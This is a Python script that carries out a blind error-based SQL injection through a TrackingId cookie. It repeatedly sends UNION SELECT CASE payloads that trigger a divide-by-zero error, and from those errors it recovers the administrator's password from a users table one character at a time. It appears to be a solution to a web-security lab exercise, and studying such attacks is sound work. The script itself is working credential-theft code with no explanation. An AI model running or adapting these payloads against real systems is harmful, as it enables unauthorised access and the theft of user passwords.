import requests
import string

url = '/'

session = requests.session()

def send_request(payload):

    headers = {
        'Cookie': f"TrackingId=test{payload}"
    }

    response = session.get(url, headers=headers)
    return 'Internal Server Error' in response.content.decode()


def retrieve_password_char(password):

    current_index = len(password) + 1

    for c in string.printable:

        ascii_code = ord(c)
        payload = f"' UNION SELECT CASE WHEN (ASCII(SUBSTR(password,{current_index},1))='{ascii_code}') THEN to_char(1/0) ELSE 'b' END FROM users WHERE username='administrator'--"
        # print(payload)

        if send_request(payload):
            return c
        else:
            pass

    return None


def retrieve_password():

    password = ""

    while True:

        password_char = retrieve_password_char(password)

        if password_char is None:
            break

        print(f"[+] Found char: {password_char}")
        password += password_char

    print(f"[+] Found password: {password}")

def main():

    # payload = "xyz' UNION SELECT CASE WHEN (ASCII(SUBSTR(username,1,1))=98) THEN to_char(1/0) ELSE 'b' END FROM users--"
    
    # if send_request(payload):
    #     print(f"[+] SQL query returned at least 1 row")
    # else:
    #     print(f"[-] SQL query returned no rows")

    retrieve_password()

if __name__ == "__main__":
    main()
